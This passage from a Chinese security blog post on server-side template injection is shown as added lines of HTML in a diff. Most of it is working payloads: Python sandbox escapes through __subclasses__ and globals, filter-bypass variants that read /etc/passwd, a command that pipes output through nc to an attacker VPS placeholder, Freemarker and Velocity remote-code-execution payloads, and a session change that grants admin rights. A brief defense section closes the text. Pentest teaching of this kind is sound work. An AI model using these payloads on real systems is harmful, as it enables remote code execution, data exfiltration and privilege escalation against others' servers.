+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">用法：os.system<span class="o">(</span><span class="nb">command</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">但是用这个无法回显
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.os.popen()</strong></p>
+<p>我们可以用这个</p>
+<p>用法：<code>os.popen(command[,mode[,bufsize]])</code>
+说明：<code>mode – 模式权限可以是 ‘r’(默认) 或 ‘w’</code>。
+popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1），可见它获取返回值的方式和os.system不同。</p>
+<p>还需要了解一个魔法函数：<code>globals</code>，该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">()</span>.__class__.__bases__<span class="o">[</span>0<span class="o">]</span>.__subclasses__<span class="o">()[</span>59<span class="o">]</span>.__init__.func_globals.values<span class="o">()[</span>13<span class="o">][</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls &#34;).read()&#39;</span> <span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3.subprocess</strong></p>
+<p>如果os被过滤了可以用subprocess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mf">1.</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">Python</span> <span class="mf">2.5</span><span class="n">中新增的函数</span><span class="err">。</span> <span class="n">执行指定的命令</span><span class="err">，</span><span class="n">如果执行成功则返回状态码</span><span class="err">，</span><span class="n">否则抛出异常</span><span class="err">。</span><span class="n">其功能等价于subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="err">…</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">Python</span> <span class="mf">2.7</span><span class="n">中新增的的函数</span><span class="err">。</span><span class="n">执行指定的命令</span><span class="err">，</span><span class="n">如果执行状态码为0则返回命令执行结果</span><span class="err">，</span><span class="n">否则抛出异常</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="err">“</span><span class="n">command</span><span class="err">”</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">说明</span><span class="err">：</span><span class="k">class</span> <span class="nc">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">startupinfo</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">creationflags</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Popen非常强大</span><span class="err">，</span><span class="n">支持多种参数和模式</span><span class="err">，</span><span class="n">通过其构造函数可以看到支持很多参数</span><span class="err">。</span><span class="n">但Popen函数存在缺陷在于</span><span class="err">，</span><span class="n">它是一个阻塞的方法</span><span class="err">，</span><span class="n">如果运行cmd命令时产生内容非常多</span><span class="err">，</span><span class="n">函数就容易阻塞</span><span class="err">。</span><span class="n">另一点</span><span class="err">，</span><span class="n">Popen方法也不会打印出cmd的执行信息</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>__<strong>init方法</strong></p>
+<p><code>__init__</code>方法用于将对象实例化，在这个函数下我们可以通过<code>funcglobals</code>（或者<code>__globals</code>）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[]</span>.__class__.__base__.__subclasses__<span class="o">()[</span>59<span class="o">]</span>.__init__.__globals__<span class="o">[</span><span class="s1">&#39;linecache&#39;</span><span class="o">]</span>.__dict__<span class="o">[</span><span class="s1">&#39;os&#39;</span><span class="o">]</span>.system<span class="o">(</span><span class="s1">&#39;ls&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[]</span>.__class__.__base__.__subclasses__<span class="o">()[</span>59<span class="o">]</span>.__init__.func_globals<span class="o">[</span><span class="s1">&#39;linecache&#39;</span><span class="o">]</span>.__dict__.values<span class="o">()[</span>12<span class="o">]</span>.system<span class="o">(</span><span class="s1">&#39;ls&#39;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>无回显处理:</strong></p>
+<p>当我们用os命令执行没回显时，可以用nc把回显发到vps上:</p>
+<p>vps:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvvp <span class="m">8888</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>2<span class="o">]</span>.__subclasses__<span class="o">()[</span>71<span class="o">]</span>.__init__.__globals__<span class="o">[</span><span class="s1">&#39;os&#39;</span><span class="o">]</span>.system<span class="o">(</span><span class="s1">&#39;ls | nc &lt;VPS的IP&gt; &lt;端口号&gt;&#39;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>{% raw %}</p>
+<h4 id="bypass">Bypass</h4>
+<p><strong>0.拼接</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">object.__subclasses__<span class="o">()[</span>59<span class="o">]</span>.__init__.func_globals<span class="o">[</span><span class="s1">&#39;linecache&#39;</span><span class="o">]</span>.__dict__<span class="o">[</span><span class="s1">&#39;o&#39;</span>+<span class="s1">&#39;s&#39;</span><span class="o">]</span>.__dict__<span class="o">[</span><span class="s1">&#39;sy&#39;</span>+<span class="s1">&#39;stem&#39;</span><span class="o">](</span><span class="s1">&#39;ls&#39;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>1.过滤[]等括号</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用gititem绕过。如原poc {{&#34;&#34;.class.bases[0]}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">绕过后{{&#34;&#34;.class.bases.getitem(0)}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）
+request变量可以访问所有已发送的参数，因此我们可以request.args.param用来检索新的paramGET参数的值,将其中的request.args改为request.values则利用post的方式进行传参</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.过滤了subclasses，拼凑法</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">原poc
+</span></span><span class="line"><span class="cl">{{&#34;&#34;.class.bases[0].subclasses()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">绕过 
+</span></span><span class="line"><span class="cl">{{&#34;&#34;.class.bases[0][&#39;subcla&#39;+&#39;sses&#39;](https://xz.aliyun.com/t/3679)}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3.过滤class</strong></p>
+<p>使用session</p>
+<p>poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{session[&#39;cla&#39;+&#39;ss&#39;].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{session[&#39;__cla&#39;+&#39;ss__&#39;].__mro__[12]}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">request[&#39;__cl&#39;+&#39;ass__&#39;].__mro__[12]}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>4.timeit姿势</strong></p>
+<p>可以学习一下 2017 swpu-ctf的一道沙盒python题，</p>
+<p>这里不详说了，博大精深，我只意会一二。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import timeit
+</span></span><span class="line"><span class="cl">timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;dir&#39;)&#34;,number=1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import platform
+</span></span><span class="line"><span class="cl">print platform.popen(&#39;dir&#39;).read()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>5.过滤一些函数名如<code>__import__</code></strong></p>
+<p>python的初始模块_builtin__里有很多危险的方法，一条路没了就找找其他的路
+我们可以直接用 eval() exec() execfile()等</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__builtins__.eval()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>6.过滤双下划线__</strong></p>
+<p>request方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;/etc/passwd&#39;).read()
+</span></span><span class="line"><span class="cl">}}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>globals</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>收藏的一些poc</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39; )
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{{request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&#34;os&#34;).po&#39;+&#39;pen(&#34;ca&#34;+&#34;t a.php&#34;).re&#39;+&#39;ad()&#39;)}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以参考一下P师傅的 <a href="https://p0sec.net/index.php/archives/120/"target="_blank" rel="external nofollow noopener noreferrer">https://p0sec.net/index.php/archives/120/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<h4 id="实战">实战</h4>
+<p>每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则,
+所以我们在挖掘之前有必要对网站的web框架进行检查，否则很多时候{{}}并没有用，导致错误判断</p>
+<p>实战中要测试重点是看一些<strong>url的可控</strong>，比如url输入什么就输出什么。
+<strong>前期收集</strong>好网站的开发语言以及框架，防止错误利用{{}}而导致错误判断。
+如下图较全的反映了ssti的一些模板渲染引擎及利用：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/img/ssti.png"
+    data-srcset="http://image.xpshuai.cn/img/ssti.png, http://image.xpshuai.cn/img/ssti.png 1.5x, http://image.xpshuai.cn/img/ssti.png 2x"
+    data-sizes="auto"
+    alt="ssti"
+    title="ssti"/></p>
+<p>{% endraw %}</p>
+<h3 id="java的freemarker">Java的Freemarker</h3>
+<p>Freemarker模板语言(FTL)</p>
+<p><strong>1.内建函数的利用</strong></p>
+<p><strong>2.new函数的利用</strong></p>
+<p>new函数可以创建一个继承自freemarker.template.TemplateModel类的实例。</p>
+<p>查阅代码发现<code>freemarker.template.utility.Execute#exec</code>可以自行任意代码，因此可以通过new函数实例化一个Execute对象并执行exec()方法造成任意代码执行。</p>
+<p>Payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span> <span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="o">?</span><span class="k">new</span><span class="o">()&gt;</span><span class="n">$</span><span class="o">(</span><span class="n">value</span><span class="o">(</span><span class="s">&#34;calc.exe&#34;</span><span class="o">))&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>freemarker.template.utility</code>包中三个类都可以被用来执行代码：</p>
+<ul>
+<li>ObjectConstructor</li>
+<li>JythonRuntime</li>
+<li>Execute</li>
+</ul>
+<p>OFCMS1.1.2版本的注入漏洞就是采用的Freemarker</p>
+<p><strong>3.api函数的利用</strong></p>
+<p>api函数可以用来访问java api，使用方法为：<code>value?api.someJavaMethod()</code>,相当于<code>value.someJavaMethod()</code>。因此可以利用api函数通过getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span> <span class="n">classLoader</span><span class="o">=</span><span class="n">object</span><span class="o">?</span><span class="n">api</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">()&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">$</span><span class="o">(</span><span class="n">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">&#34;Evil.class&#34;</span><span class="o">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>防御：</strong></p>
+<ul>
+<li>从2.3.22版本开始，api_builtin_enabled的默认值为false，这意味着api内家函数从此之后不能随意使用；</li>
+<li>官方还提供了3个预定义的解析器来限制new函数对类的访问：</li>
+<li>USRESTRICTED_RESOLVER</li>
+<li>SAFER_RESOLVER</li>
+<li>ALLOW_NOTHING_RESOLVER</li>
+</ul>
+<h3 id="java的velovity模板引擎">Java的Velovity模板引擎</h3>
+<p>在Java中，Velovity使用的较多，简单介绍一下Velovity的基本语法和RCE方法。</p>
+<p>在Velovity中，用<code>#</code>来表示Velovity的脚步语句，比如<code>#set</code>,<code>#if</code>,<code>#foreach</code>等</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#if($msg.img)
+</span></span><span class="line"><span class="cl">&lt;img src=$msg.imgs border=0&gt;
+</span></span><span class="line"><span class="cl">#else
+</span></span><span class="line"><span class="cl">&lt;img src=&#34;a.jpg&#34;&gt;
+</span></span><span class="line"><span class="cl">#end
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$</code>在Velovity中标识一个对象。根据SpEL表达式注入的知识，我们知道一旦可以调用对象，便有办法来构造命令执行语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$e</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">exec</span><span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在使用Velovity模板注入中，如果无法进行名住，我们可以修改Cookie来进行权限升级：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;IS_ADMIN&#34;</span><span class="o">,</span> <span class="s">&#34;1&#34;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在漏洞不存在回显的时候，并且容器为Tomcat7的时候，可以通过如下方法来构造一个有回显的命令执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$str</span><span class="o">=</span><span class="n">$class</span><span class="o">.</span><span class="na">inspect</span><span class="o">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="o">).</span><span class="na">type</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$cstr</span><span class="o">=</span><span class="n">$class</span><span class="o">.</span><span class="na">inspect</span><span class="o">(</span><span class="s">&#34;java.lang.Character&#34;</span><span class="o">).</span><span class="na">type</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$ex</span><span class="o">=</span><span class="n">$class</span><span class="o">.</span><span class="na">inspect</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">type</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;whoami&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">$ex</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>     
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$out</span><span class="o">=</span><span class="n">$ex</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">foreach</span><span class="o">(</span><span class="n">Si</span> <span class="n">in</span> <span class="o">[</span><span class="mf">1.</span><span class="o">.</span><span class="na">$out</span><span class="o">.</span><span class="na">available</span><span class="o">()])</span>
+</span></span><span class="line"><span class="cl"><span class="n">$str</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">$chr</span><span class="o">.</span><span class="na">toChars</span><span class="o">(</span><span class="n">$out</span><span class="o">.</span><span class="na">read</span><span class="o">()))</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">end</span>     
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>代码审计的时候，搜索模板引擎的相关关键字即可</strong></p>
+<h2 id="漏洞防御">漏洞防御</h2>
+<ul>
+<li>避免用户能够直接控制模板的熟并对其进行过滤</li>
+<li>如需要向用户公开模板编辑，则可以选择无逻辑的模板引擎，如Handlebars、Moustache等</li>
+<li></li>
+</ul>
+<h2 id="参考">参考</h2>
+<p><a href="https://www.cnblogs.com/murkuo/articles/14864952.html"target="_blank" rel="external nofollow noopener noreferrer">ssti注入 - MuRKuo - 博客园 (cnblogs.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://www.jianshu.com/p/b6f1aea3a2eb"target="_blank" rel="external nofollow noopener noreferrer">SSTI（模板注入）基础总结 - 简书 (jianshu.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://www.anquanke.com/post/id/188172"target="_blank" rel="external nofollow noopener noreferrer">SSTI/沙盒逃逸详细总结 - 安全客，安全资讯平台 (anquanke.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/SSTI%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ssti/' class="post-tag">SSTI</a><a href='/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/' class="post-tag">服务端模板注入</a><a href='/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/' class="post-tag">代码审计</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="SQL注入漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SQL注入漏洞</a>
+      <a href="/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="表达式注入初探">表达式注入初探<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
